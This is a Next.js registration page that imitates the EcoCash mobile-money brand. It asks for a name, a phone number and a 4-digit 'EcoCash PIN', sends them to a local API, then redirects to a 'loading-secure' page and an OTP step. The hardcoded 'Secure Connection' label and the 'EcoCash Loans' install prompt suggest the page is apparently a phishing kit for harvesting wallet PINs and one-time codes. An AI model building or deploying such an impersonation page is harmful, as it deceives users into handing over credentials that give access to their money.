'use client';

import type React from 'react';
import Link from 'next/link';
import { useState, useEffect } from 'react';
import { Eye, EyeOff, Home, Search, Check } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { useRouter } from 'next/navigation';

export default function RegisterPage() {
  const router = useRouter();
  const [name, setName] = useState('');
  const [countryCode, setCountryCode] = useState('+263'); // Default to Zimbabwe
  const [phone, setPhone] = useState('');
  const [pin, setPin] = useState(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [loading, setLoading] = useState(false);
  const [showCountrySelector, setShowCountrySelector] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  // Comprehensive list of African country codes
  const africanCountries = [
    { code: '+213', name: 'Algeria', dialCode: '213' },
    { code: '+244', name: 'Angola', dialCode: '244' },
    { code: '+267', name: 'Botswana', dialCode: '267' },
    { code: '+237', name: 'Cameroon', dialCode: '237' },
    { code: '+238', name: 'Cape Verde', dialCode: '238' },
    { code: '+236', name: 'Central African Republic', dialCode: '236' },
    { code: '+235', name: 'Chad', dialCode: '235' },
    { code: '+269', name: 'Comoros', dialCode: '269' },
    { code: '+242', name: 'Congo', dialCode: '242' },
    { code: '+243', name: 'Congo, Democratic Republic', dialCode: '243' },
    { code: '+253', name: 'Djibouti', dialCode: '253' },
    { code: '+20', name: 'Egypt', dialCode: '20' },
    { code: '+240', name: 'Equatorial Guinea', dialCode: '240' },
    { code: '+291', name: 'Eritrea', dialCode: '291' },
    { code: '+268', name: 'Eswatini', dialCode: '268' },
    { code: '+251', name: 'Ethiopia', dialCode: '251' },
    { code: '+241', name: 'Gabon', dialCode: '241' },
    { code: '+220', name: 'Gambia', dialCode: '220' },
    { code: '+233', name: 'Ghana', dialCode: '233' },
    { code: '+224', name: 'Guinea', dialCode: '224' },
    { code: '+245', name: 'Guinea-Bissau', dialCode: '245' },
    { code: '+225', name: 'Ivory Coast', dialCode: '225' },
    { code: '+254', name: 'Kenya', dialCode: '254' },
    { code: '+266', name: 'Lesotho', dialCode: '266' },
    { code: '+231', name: 'Liberia', dialCode: '231' },
    { code: '+218', name: 'Libya', dialCode: '218' },
    { code: '+261', name: 'Madagascar', dialCode: '261' },
    { code: '+265', name: 'Malawi', dialCode: '265' },
    { code: '+223', name: 'Mali', dialCode: '223' },
    { code: '+222', name: 'Mauritania', dialCode: '222' },
    { code: '+230', name: 'Mauritius', dialCode: '230' },
    { code: '+262', name: 'Mayotte', dialCode: '262' },
    { code: '+212', name: 'Morocco', dialCode: '212' },
    { code: '+258', name: 'Mozambique', dialCode: '258' },
    { code: '+264', name: 'Namibia', dialCode: '264' },
    { code: '+227', name: 'Niger', dialCode: '227' },
    { code: '+234', name: 'Nigeria', dialCode: '234' },
    { code: '+260', name: 'Zambia', dialCode: '260' },
    { code: '+263', name: 'Zimbabwe', dialCode: '263' },
    { code: '+255', name: 'Tanzania', dialCode: '255' },
    { code: '+256', name: 'Uganda', dialCode: '256' },
    { code: '+252', name: 'Somalia', dialCode: '252' },
    { code: '+249', name: 'Sudan', dialCode: '249' },
    { code: '+211', name: 'South Sudan', dialCode: '211' },
    { code: '+27', name: 'South Africa', dialCode: '27' },
    { code: '+232', name: 'Sierra Leone', dialCode: '232' },
    { code: '+228', name: 'Togo', dialCode: '228' },
    { code: '+229', name: 'Benin', dialCode: '229' },
  ];

  // Other countries that might be relevant
  const otherCountries = [
    { code: '+93', name: 'Afghanistan', dialCode: '93' },
    { code: '+355', name: 'Albania', dialCode: '355' },
    { code: '+376', name: 'Andorra', dialCode: '376' },
    { code: '+971', name: 'UAE', dialCode: '971' },
    { code: '+967', name: 'Yemen', dialCode: '967' },
    { code: '+960', name: 'Maldives', dialCode: '960' },
    { code: '+972', name: 'Israel', dialCode: '972' },
    { code: '+91', name: 'India', dialCode: '91' },
    { code: '+81', name: 'Japan', dialCode: '81' },
    { code: '+82', name: 'South Korea', dialCode: '82' },
    { code: '+84', name: 'Vietnam', dialCode: '84' },
    { code: '+86', name: 'China', dialCode: '86' },
    { code: '+61', name: 'Australia', dialCode: '61' },
    { code: '+44', name: 'UK', dialCode: '44' },
    { code: '+1', name: 'USA', dialCode: '1' },
    { code: '+33', name: 'France', dialCode: '33' },
    { code: '+49', name: 'Germany', dialCode: '49' },
    { code: '+39', name: 'Italy', dialCode: '39' },
    { code: '+34', name: 'Spain', dialCode: '34' },
    { code: '+31', name: 'Netherlands', dialCode: '31' },
    { code: '+46', name: 'Sweden', dialCode: '46' },
    { code: '+47', name: 'Norway', dialCode: '47' },
    { code: '+41', name: 'Switzerland', dialCode: '41' },
    { code: '+43', name: 'Austria', dialCode: '43' },
    { code: '+32', name: 'Belgium', dialCode: '32' },
    { code: '+45', name: 'Denmark', dialCode: '45' },
    { code: '+358', name: 'Finland', dialCode: '358' },
    { code: '+353', name: 'Ireland', dialCode: '353' },
    { code: '+351', name: 'Portugal', dialCode: '351' },
    { code: '+420', name: 'Czech Republic', dialCode: '420' },
    { code: '+421', name: 'Slovakia', dialCode: '421' },
    { code: '+36', name: 'Hungary', dialCode: '36' },
    { code: '+48', name: 'Poland', dialCode: '48' },
    { code: '+40', name: 'Romania', dialCode: '40' },
    { code: '+7', name: 'Russia', dialCode: '7' },
    { code: '+90', name: 'Turkey', dialCode: '90' },
  ];

  const allCountries = [...africanCountries, ...otherCountries];

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length > 15) value = value.slice(0, 15); // Limit to 15 digits max
    setPhone(value);
  };

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value.slice(-1);
    setPin(newPin);

    // Auto-focus next input
    if (value && index < 3) {
      const nextInput = document.getElementById(`pin-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pin[index] && index > 0) {
      const prevInput = document.getElementById(`pin-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleRegister = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !phone || pin.some((p) => !p)) {
      alert('Please enter name, phone number and PIN');
      return;
    }

    setLoading(true);
    
    try {
      // Combine country code and phone number
      const fullPhone = countryCode + phone;
      const pinString = pin.join('');
      
      // Send registration request to API
      const response = await fetch('/api/auth/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          name, 
          phone: fullPhone,
          pin: pinString // Send the PIN to the API
        }),
      });
      
      const data = await response.json();
      
      if (response.ok && data.success) {
        // Redirect to loading page with parameters
        router.push(`/loading-secure?action=signup&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(fullPhone)}&redirect=otp`);
      } else {
        alert(data.error || 'Registration failed');
      }
    } catch (error) {
      console.error('Registration error:', error);
      alert('An error occurred during registration');
    } finally {
      setLoading(false);
    }
  };

  const selectedCountry = allCountries.find(c => c.code === countryCode) || allCountries.find(c => c.code === '+263');

  // Filter countries based on search query
  const filteredCountries = allCountries.filter(country => 
    country.name.toLowerCase().includes(searchQuery.toLowerCase()) || 
    country.dialCode.includes(searchQuery)
  );

  // Close country selector when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (showCountrySelector && !target.closest('.country-selector-container')) {
        setShowCountrySelector(false);
      }
    };

    document.addEventListener('mousedown', handleClickOutside);
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
    };
  }, [showCountrySelector]);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Top Bar */}
      <div className="bg-white border-b border-gray-200 px-6 py-3 flex items-center justify-between">
        <Link
          href="/"
          className="flex items-center gap-2 text-blue-600 hover:text-blue-700 font-semibold transition-colors"
        >
          <Home className="w-5 h-5" />
          Home
        </Link>
        <div className="text-sm text-green-500 font-semibold">Secure Connection</div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-12">
        {/* Logo */}
        <div className="mb-12 text-center">
          <h1 className="text-5xl font-black">
            <span className="text-blue-600">Eco</span>
            <span className="text-red-600">Cash</span>
          </h1>
        </div>

        {/* Register Section */}
        <div className="w-full max-w-md">
          <h2 className="text-3xl font-bold text-gray-900 text-center mb-10">Create Account</h2>

          <form onSubmit={handleRegister} className="space-y-6">
            {/* Name Input */}
            <div>
              <input
                type="text"
                placeholder="Full Name"
                value={name}
                onChange={(e) => setName(e.target.value)}
                className="w-full px-4 py-4 text-lg border-2 border-blue-500 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 placeholder-gray-400"
              />
            </div>

            {/* Phone Number Input with Country Selector */}
            <div className="relative">
              <label className="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
              <div className="flex gap-2">
                {/* Country Code Selector */}
                <div className="relative w-1/3 country-selector-container">
                  <button
                    type="button"
                    className="w-full px-3 py-4 text-lg border-2 border-blue-500 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 bg-white flex items-center justify-between"
                    onClick={() => setShowCountrySelector(!showCountrySelector)}
                  >
                    <span className="flex items-center gap-1">
                      <span>{selectedCountry?.code}</span>
                    </span>
                  </button>
                  
                  {showCountrySelector && (
                    <div className="absolute z-10 mt-1 w-full bg-white border border-gray-300 rounded-lg shadow-lg max-h-80 overflow-hidden">
                      {/* Search Input */}
                      <div className="p-2 border-b border-gray-200 relative">
                        <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                        <input
                          type="text"
                          placeholder="Search countries..."
                          value={searchQuery}
                          onChange={(e) => setSearchQuery(e.target.value)}
                          className="w-full pl-9 pr-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-300"
                        />
                      </div>
                      
                      {/* Countries List */}
                      <div className="max-h-60 overflow-y-auto">
                        {filteredCountries.length > 0 ? (
                          filteredCountries.map((country) => (
                            <div
                              key={country.code}
                              className={`px-4 py-3 hover:bg-blue-50 cursor-pointer flex items-center justify-between ${
                                countryCode === country.code ? 'bg-blue-50' : ''
                              }`}
                              onClick={() => {
                                setCountryCode(country.code);
                                setShowCountrySelector(false);
                                setSearchQuery('');
                              }}
                            >
                              <div className="flex items-center gap-2">
                                <span>{country.code}</span>
                                <span className="text-gray-500 text-sm">{country.name}</span>
                              </div>
                              {countryCode === country.code && <Check className="w-4 h-4 text-blue-600" />}
                            </div>
                          ))
                        ) : (
                          <div className="px-4 py-3 text-gray-500">No countries found</div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
                
                {/* Phone Number Input */}
                <div className="flex-1">
                  <input
                    type="tel"
                    placeholder="77 123 4567"
                    value={phone}
                    onChange={handlePhoneChange}
                    className="w-full px-4 py-4 text-lg border-2 border-blue-500 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 placeholder-gray-400"
                  />
                </div>
              </div>
            </div>

            {/* PIN Entry Section */}
            <div className="mt-10">
              <h3 className="text-blue-600 font-bold text-center mb-2 text-lg">Secure PIN Entry</h3>
              <p className="text-gray-600 text-center text-sm mb-6">Create your 4-digit EcoCash PIN</p>

              <div className="flex justify-center gap-4 mb-6">
                {pin.map((digit, index) => (
                  <input
                    key={index}
                    id={`pin-${index}`}
                    type={showPin ? 'text' : 'password'}
                    value={digit}
                    onChange={(e) => handlePinChange(index, e.target.value)}
                    onKeyDown={(e) => handlePinKeyDown(index, e)}
                    maxLength={1}
                    className="w-16 h-16 text-3xl font-bold text-center border-2 border-gray-300 rounded-2xl focus:outline-none focus:border-blue-600 focus:ring-2 focus:ring-blue-200"
                  />
                ))}
              </div>

              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="flex items-center justify-center gap-2 text-blue-600 font-semibold hover:text-blue-700 mx-auto transition-colors"
              >
                {showPin ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                {showPin ? 'Hide PIN' : 'Show PIN'}
              </button>
            </div>

            {/* Register Button */}
            <Button
              type="submit"
              disabled={loading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 text-lg rounded-xl transition-all"
            >
              {loading ? 'Creating Account...' : 'Create Account'}
            </Button>
          </form>
        </div>
      </div>

      {/* Wavy Divider */}
      <svg 
        viewBox="0 0 1200 120" 
        preserveAspectRatio="none" 
        className="w-full h-24" 
        style={{ marginTop: "-1px" }}
      >
        <path d="M0,50 Q300,0 600,50 T1200,50 L1200,120 L0,120 Z" fill="#1e40af" />
      </svg>

      {/* Blue Section with App Promotion */}
      <div className="bg-blue-600 text-white px-6 py-10">
        <div className="max-w-md mx-auto text-center">
          <p className="text-sm opacity-90 mb-6">To register an EcoCash wallet or get assistance, click below</p>

          <div className="bg-gradient-to-br from-purple-400 to-purple-600 rounded-2xl p-8">
            <div className="flex justify-center gap-4 mb-4 opacity-70">
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
              <div className="w-6 h-6 bg-white rounded-full" />
            </div>

            <h3 className="text-xl font-bold mb-2">Install EcoCash Loans</h3>
            <p className="text-sm opacity-90 mb-6">Add to your home screen for quick access and better experience</p>

            <Button className="w-full bg-white text-purple-600 hover:bg-gray-100 font-bold py-3 rounded-xl transition-all">
              Install App
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
}